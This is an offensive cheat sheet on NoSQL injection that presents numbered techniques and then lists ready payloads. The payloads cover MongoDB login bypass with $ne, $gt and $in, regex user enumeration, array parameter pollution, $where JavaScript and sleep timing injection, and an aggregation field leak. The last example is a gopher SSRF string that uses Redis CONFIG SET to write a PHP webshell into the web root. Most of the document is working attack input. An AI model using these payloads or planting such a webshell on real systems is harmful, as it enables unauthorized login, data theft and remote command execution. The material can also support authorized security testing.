# HOW TO TEST NoSQL INJECTION ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N ways to test
1. JSON operator injection: { $ne }, { $gt }, { $regex } in body fields (Mongo/Arango/Cou).
2. Array/parameter polluting: send params as arrays to skip string check (PHP ?user[]=..., Rails user[$ne]).
3. $where / $function: server-side JS execution (blind + error).
4. Regex-based exfil: {"user":{"$regex":"^a.*"}} -> charset brute via response shape.
5. NoSQL-blind timing: sleep(5000) inside $where / $eq regex catastrophic.
6. Casting types: turn string field into object (strip, type confusion).
7. Direct Mongo API: find/mapReduce endpoints if reachable by SSRF (27017).
8. Redis as NoSQL: AUTH-less write via SSRF gopher (see SSRF-Advanced file) or direct 6379.

## Step-by-step on target
1. Login/search endpoints w/ JSON body. Probe: id=1 vs id={...} with {$ne:null}.
2. Response-diff:  {"user":"admin","pass":{"$ne":null}} vs a false one.
3. If JS allowed: target $where.
4. Regex exfil loop column-by-column (see examples).
5. For redis/gopher path: see SSRF folder (Redis CONFIG->dbfilename webshell).

## Worked examples (concrete)
MongoDB auth bypass:
```
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"user":"admin","password":{"$in":["admin","password","pass123"]}}
Regex user enumeration:
{"user":{"$regex":"^a."},"pass":"x"}     # true for users starting with 'a'
{"id":{"$regex":"^5[0-9]"}}               # leaked id range
Arrays (PHP/Rails param style):
```
?user[$ne]=1&pass[$ne]=1
?user[$regex]=^adm
?id[$gt]=        # Cast filter to skip non-strings
$where JS injection (if JS enabled):
```
{"$where":"this.password==this.username"}
{"$where":"sleep(4000)"}                  # blind timing
{"$where":"this.email.length>20"}
{"name":{"$where":"1==1"}}
Storage-engine integer exfil:
{"$expr":{"$gt":[{"$toInt":"$balance"},100000]}}   # aggregations reveal internals
Redis (SSRF reachable):
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x "<?php system($_GET[0]); ?>"\r\nSAVE\r\n
```

## False positives
- Response differs because of validation error (not eval) - confirm the $ operator actually hit.
- If { $ne:null } 403s but { "x":"1" } passes = it validated as string = not vulnerable (yet).

## Tools
- NoSQLMap, nosqli, Burp payload with the JSON body; Mongo shell for local copies.
